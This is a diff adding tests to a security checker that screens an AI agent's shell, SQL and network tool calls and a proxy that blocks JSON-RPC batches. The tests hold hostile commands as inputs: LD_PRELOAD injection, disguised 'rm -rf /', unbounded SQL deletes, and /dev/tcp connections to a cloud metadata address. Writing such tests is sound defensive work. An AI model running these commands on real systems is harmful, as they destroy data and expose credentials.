@@ -17,6 +17,7 @@
 
 import assert from "node:assert";
 import { S3ScopeEvaluator } from "../src/engine/s3-scope.js";
+import { McpProxyGateway } from "../src/proxy/mcp-proxy.js";
 
 async function runTests() {
   console.log("🧪 Running Aletheia MCP Test Suite...\n");
@@ -266,6 +267,34 @@ async function runTests() {
     assert.strictEqual(r3.verdict, "ALLOW");
   });
 
+  test("Blocks dynamic linker library injection: 'LD_PRELOAD=/evil.so /bin/ls'", () => {
+    const res = evaluator.evaluate("bash", { command: "LD_PRELOAD=/evil.so /bin/ls" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "PRIVILEGE_ESCALATION"));
+  });
+
+  test("Blocks bash default-value parameter expansion: '${X:-rm} -rf /'", () => {
+    const res = evaluator.evaluate("bash", { command: "${X:-rm} -rf /" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_FS_COMMAND"));
+  });
+
+  test("Immune to O(n²) blowup on 100KB braceless payload (<5ms)", () => {
+    const large100k = "a".repeat(100000);
+    const start = performance.now();
+    const res = evaluator.evaluate("bash", { command: large100k });
+    const duration = performance.now() - start;
+    assert.ok(duration < 10, `Execution took ${duration.toFixed(2)}ms, expected <10ms`);
+  });
+
+  test("Immune to O(n²) blowup on 100KB payload with brace expansion (<5ms)", () => {
+    const largeWithBrace = "prefix " + "a".repeat(50000) + " /{etc,usr} " + "b".repeat(50000);
+    const start = performance.now();
+    const res = evaluator.evaluate("bash", { command: largeWithBrace });
+    const duration = performance.now() - start;
+    assert.ok(duration < 10, `Execution took ${duration.toFixed(2)}ms, expected <10ms`);
+  });
+
   // ── 3. Credential & Secrets Access ─────────────────────────────────────────
   console.log("\nCategory 3: Credential & Sensitive File Access (S3)");
 
@@ -442,6 +471,39 @@ async function runTests() {
     assert.strictEqual(res.violations.length, 0);
   });
 
+  test("Blocks SQL CTE unbounded delete: 'WITH d AS (DELETE FROM accounts WHERE true RETURNING *)'", () => {
+    const writeEvaluator = new S3ScopeEvaluator({ allowWrite: true });
+    const res = writeEvaluator.evaluate("sql", { query: "WITH d AS (DELETE FROM accounts WHERE true RETURNING *) SELECT * FROM d;" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNBOUNDED_SQL_MUTATION"));
+  });
+
+  test("Blocks SQL DO block unbounded delete: 'DO $$ BEGIN DELETE FROM users; END $$;'", () => {
+    const writeEvaluator = new S3ScopeEvaluator({ allowWrite: true });
+    const res = writeEvaluator.evaluate("sql", { query: "DO $$ BEGIN DELETE FROM users; END $$;" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNBOUNDED_SQL_MUTATION"));
+  });
+
+  test("Allows SQL dollar-quoted literal in SELECT: 'SELECT $$DROP TABLE users;$$;' without false positive", () => {
+    const res = evaluator.evaluate("sql", { query: "SELECT $$DROP TABLE users;$$;" });
+    assert.strictEqual(res.verdict, "ALLOW");
+    assert.strictEqual(res.violations.length, 0);
+  });
+
+  test("Blocks MySQL comment preceding DDL: '# MySQL comment\\nDROP TABLE users;'", () => {
+    const res = evaluator.evaluate("sql", { query: "# MySQL comment\nDROP TABLE users;" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "DESTRUCTIVE_SQL_DDL"));
+  });
+
+  test("Allows SQL CTE delete with bounded WHERE under allowWrite: true", () => {
+    const writeEvaluator = new S3ScopeEvaluator({ allowWrite: true });
+    const res = writeEvaluator.evaluate("sql", { query: "WITH d AS (DELETE FROM accounts WHERE id = 123 RETURNING *) SELECT * FROM d;" });
+    assert.strictEqual(res.verdict, "ALLOW");
+    assert.strictEqual(res.violations.length, 0);
+  });
+
   // ── 7. Network & SSRF Metadata Guard ───────────────────────────────────────
   console.log("\nCategory 7: Network & SSRF Metadata Guard (S3)");
 
@@ -497,6 +559,25 @@ async function runTests() {
     const res = loopbackEvaluator.evaluate("fetch", { url: "http://[::ffff:127.0.0.1]:3000/api" });
     assert.strictEqual(res.verdict, "ALLOW");
     assert.strictEqual(res.violations.length, 0);
+  });
+
+  test("Blocks bash socket pseudo-device to AWS metadata: 'cat /dev/tcp/169.254.169.254/80'", () => {
+    const res = evaluator.evaluate("bash", { command: "cat /dev/tcp/169.254.169.254/80" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNAUTHORIZED_NETWORK_EGRESS"));
+  });
+
+  test("Blocks bash socket pseudo-device to private subnet: 'echo test > /dev/tcp/10.0.0.1/4444'", () => {
+    const res = evaluator.evaluate("bash", { command: "echo test > /dev/tcp/10.0.0.1/4444" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNAUTHORIZED_NETWORK_EGRESS"));
+  });
+
+  test("Blocks bash socket pseudo-device even with allowNetwork: true when targeting AWS metadata", () => {
+    const netEvaluator = new S3ScopeEvaluator({ allowNetwork: true });
+    const res = netEvaluator.evaluate("bash", { command: "cat < /dev/tcp/169.254.169.254/80" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNAUTHORIZED_NETWORK_EGRESS"));
   });
 
   // ── 8. Adversarial Input Injections ────────────────────────────────────────
@@ -589,6 +670,84 @@ async function runTests() {
   test("Allows reading public file 'cat README.md'", () => {
     const res = evaluator.evaluate("bash", { command: "cat README.md" });
     assert.strictEqual(res.verdict, "ALLOW");
+  });
+
+  // ── 10. Transparent Proxy JSON-RPC Batching ────────────────────────────────
+  console.log("\nCategory 10: Transparent Proxy JSON-RPC Batch Evaluation (Proxy Mode)");
+
+  test("Proxy blocks JSON-RPC batch containing malicious tool call and never forwards to downstream", () => {
+    const proxy = new McpProxyGateway(evaluator);
+    let clientOutput = "";
+    let downstreamOutput = "";
+
+    const batchPayload = JSON.stringify([
+      {
+        jsonrpc: "2.0",
+        id: 1,
+        method: "tools/call",
+        params: { name: "bash", arguments: { command: "rm -rf /" } },
+      },
+      {
+        jsonrpc: "2.0",
+        id: 2,
+        method: "tools/call",
+        params: { name: "bash", arguments: { command: "git status" } },
+      },
+    ]);
+
+    proxy.processClientMessage(
+      batchPayload,
+      (downstream) => {
+        downstreamOutput += downstream;
+      },
+      (client) => {
+        clientOutput += client;
+      }
+    );
+
+    assert.strictEqual(downstreamOutput, "", "Downstream must receive NOTHING when batch contains blocked call");
+    assert.ok(clientOutput.includes('"isError":true'));
+    assert.ok(clientOutput.includes("BLOCKED"));
+
+    const parsed = JSON.parse(clientOutput);
+    assert.strictEqual(parsed.length, 2);
+    assert.strictEqual(parsed[0].id, 1);
+    assert.strictEqual(parsed[1].id, 2);
+  });
+
+  test("Proxy transparently forwards JSON-RPC batch when all tool calls are allowed", () => {
+    const proxy = new McpProxyGateway(evaluator);
+    let clientOutput = "";
+    let downstreamOutput = "";
+
+    const batchPayload = JSON.stringify([
+      {
+        jsonrpc: "2.0",
+        id: 10,
+        method: "tools/call",
+        params: { name: "bash", arguments: { command: "git status" } },
+      },
+      {
+        jsonrpc: "2.0",
+        id: 11,
+        method: "tools/call",
+        params: { name: "bash", arguments: { command: "git log -n 1" } },
+      },
+    ]);
+
+    proxy.processClientMessage(
+      batchPayload,
+      (downstream) => {
+        downstreamOutput += downstream;
+      },
+      (client) => {
+        clientOutput += client;
+      }
+    );
+
+    assert.strictEqual(clientOutput, "", "Client should receive nothing directly from proxy for allowed batch");
+    assert.ok(downstreamOutput.includes("git status"));
+    assert.ok(downstreamOutput.includes("git log -n 1"));
   });
 
   console.log(`\n========================================`);
